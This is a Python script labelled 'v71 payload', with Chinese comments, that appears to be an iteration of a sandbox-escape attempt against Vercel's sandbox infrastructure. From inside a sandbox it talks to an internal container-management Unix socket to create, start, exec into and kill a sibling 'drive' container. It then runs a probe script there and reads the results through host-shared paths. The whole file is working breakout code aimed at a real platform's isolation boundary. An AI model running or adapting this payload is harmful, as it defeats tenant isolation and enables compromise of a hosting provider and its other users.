# -*- coding: utf-8 -*-
"""v71 payload: Exec 输出写宿主共享 /run/vercel/share + 完成后 Kill(drive 容器)"""
import socket, time, os

OUT = '/vercel/sandbox/v71c.out'
PROBE_OUT = '/run/vercel/share/exec_probe.out'
PROBE_OUT2 = '/vercel/sandbox/exec_probe.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v71c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    log('V71 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    log('create-drive -> %s | %s' % (st, bd[:200]))
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % cid)
    if not cid:
        log('V71C_DONE')
        return

    st, bd = rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('start -> %s | %s' % (st, bd[:150]))
    time.sleep(1)

    argv = '["/bin/sh","/vercel/sandbox/exec_probe.sh"]'
    st, bd = rpc(CTR + '/Exec', '{"containerId":"%s","process":{"argv":%s}}' % (cid, argv), t=5)
    log('exec -> %s | %s' % (st, bd[:200]))
    if '"processId"' in bd:
        pid_ = bd.split('"processId":"')[1].split('"')[0]
        log('PROC=%s' % pid_)

    # 轮询两个可能的输出位置
    t_wait = 0
    while t_wait < 20:
        time.sleep(1)
        t_wait += 1
        for p in (PROBE_OUT, PROBE_OUT2):
            try:
                if os.path.exists(p):
                    cur = open(p, errors='replace').read()
                    if cur.strip():
                        log('--- probe out from %s ---\n%s' % (p, cur[:8000]))
                        break
            except Exception:
                pass
        else:
            continue
        break

    # Kill drive 容器, 释放 drive
    st, bd = rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('kill -> %s | %s' % (st, bd[:150]))
    log('V71C_DONE')


main()
